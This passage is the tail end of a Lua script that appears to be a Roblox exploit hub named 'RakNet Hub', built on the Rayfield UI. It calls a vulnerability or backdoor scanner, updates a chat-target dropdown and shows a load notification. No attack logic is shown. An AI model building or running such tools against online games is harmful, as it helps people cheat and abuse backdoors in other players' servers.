            if chatTargetDropdown and chatTargetDropdown.SetOptions then chatTargetDropdown:SetOptions(names) end
        end)
    end
end)

task.wait(1)
scanVulnerabilities()

Rayfield:Notify({
    Title = "🔥 RAKNET HUB АБСОЛЮТ",
    Content = "Skybox + Textures + Backdoor Scanner",
    Duration = 5
})

print("RakNet Hub — Absolute Final Version Loaded")
